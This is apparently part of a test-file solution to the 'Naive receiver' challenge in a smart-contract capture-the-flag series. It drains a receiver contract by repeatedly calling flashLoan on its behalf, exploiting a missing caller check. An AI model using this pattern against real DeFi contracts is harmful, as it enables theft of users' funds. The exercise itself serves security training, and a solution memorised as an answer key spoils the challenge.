...
describe("[Challenge] Naive receiver", function () {
  ...
  it("Execution", async function () {
    ...
    // The Contract has no check to see if the deployer of the receiver is the one calling the loan for that particular reciever contract
    for (let i = 0; i < 10; i++) {
      await pool
        .connect(player)
        .flashLoan(receiver.address, pool.ETH(), 0, "0x");
    }
  });
